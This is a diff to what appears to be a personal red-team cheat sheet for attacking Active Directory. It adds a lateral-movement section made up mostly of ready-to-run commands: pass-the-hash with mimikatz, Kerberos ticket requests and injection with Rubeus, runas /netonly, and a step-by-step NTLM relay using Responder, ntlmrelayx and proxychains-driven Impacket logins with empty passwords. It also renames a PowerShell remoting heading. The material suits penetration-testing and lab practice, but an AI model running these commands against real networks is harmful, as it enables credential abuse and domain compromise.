@@ -34,8 +34,13 @@ This is my personal safe for arsenals. Feel free to refer and use at anytime. Yo
 	* [SID History](#sid-history)
 	* [Shadow Principal](#shadow-principal)
 	* [Foreign Principal](#foreign-principal)
+* **[Lateral Movement](#lateral-movement--post-exploitation)**
+	* [Overpass-The-Hash](#overpass-the-hash-opth)
+	* [Request TGT](#request-tgt)
+	* [runas](#runas)
+	* [NTLM Relay](#ntlm-relay)
 * **[Remote Authentication Between Computers](#remote-authentication-protocol)**
-	* [PSRemoting](#psremoting)
+	* [PSRemoting](#ps-remoting)
 	* [Winrs](#winrs)
 	* [PsExec](#psexec)
 * **[Generate VBScript dropper (APC process injection)](#generate-vbscript-dropper-apc-process-injection)**
@@ -244,14 +249,66 @@ Find-ForeignUser
 Find-ForeignGroup
 ```
 
+## Lateral Movement / Post Exploitation
+### Overpass-The-Hash (OPTH)
+_Note: This requires local administrator privilege_
+```
+# NTLM hash
+mimikatz# sekurlsa::pth /user:administrator /ntlm:<ntlm hash> /domain:CONTOSO /run:powershell.exe
+
+# AES256 key
+mimikatz# sekurlsa::pth /user:administrator /aes256:<aes256 key> /domain:CONTOSO /run:powershell.exe
+```
+
+### Request TGT 
+_Note: This will be log by the KDC_
+```
+# With plain-text
+Rubeus.exe asktgt /user:administrator /password:P@$$w0rd! /domain:contoso /ptt
+
+# With RC4 hash
+Rubeus.exe asktgt /user:administraot /rc4:<rc4-hash> /domain:contoso /ptt
+```
+
+### runas 
+```
+runas /user:contoso\administrator /netonly powershell
+```
+
+### NTLM Relay
+_Note: This attack will only work if SMB signing if disabled. This can be verify with [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) or any similar tools_
+
+1. Disable **SMB** and **HTTP** in `/etc/Responder.conf`
+2. Fire up responder. **SMB** and **HTTP** protocol now should now show as [OFF]
+```
+Responder.py -I eth0 -rdvw
+```
+3. Create a targets.txt file containing targeted ip addresses. `ntlmrelayx.py` will run captured hash to every protocol available on the given ip addresses
+```
+all://192.168.0.10
+all://192.168.0.11
+```
+4. Run `ntlmrelayx.py`
+```
+ntlmrelayx.py -tf targets.txt -smb2support -socks
+```
+5. Authenticate with any available Impacket scripts through `proxychains` and supply no password
+```
+# PsExec
+proxychains Psexec.py contoso/administrator:''@192.168.0.10
+
+# mssqlclient
+proxychains mssqlclient.py contoso/sqlsvc:''@192.168.0.15
+```
+
 ## Remote Authentication Between Computers
-### PSRemoting
-**PSRemoting** stands for PowerShell remoting, this will enable users to authenticate between powershell session in remote computers by using `*-PSSession`.
+### PS Remoting
+**PS Remoting** stands for PowerShell remoting, this will enable users to authenticate between powershell session in remote computers by using `*-PSSession`.
 ```
 # Create New PSRemoting Session (with current user privilege/no PSCredential needed)
 $sess = New-PSSession -ComputerName dc01
 
-# Creare New PSRemoting Session (with plain-text password/PSCredential needed)
+# Create New PS Remoting Session (with plain-text password/PSCredential needed)
 $username = 'contoso\studentadmin'
 $password = ConvertTo-SecureString -AsPlainText -Force 'P@$$w0rd!'
 $cred = New-Object System.Management.Automation.PSCredential($username,$password)
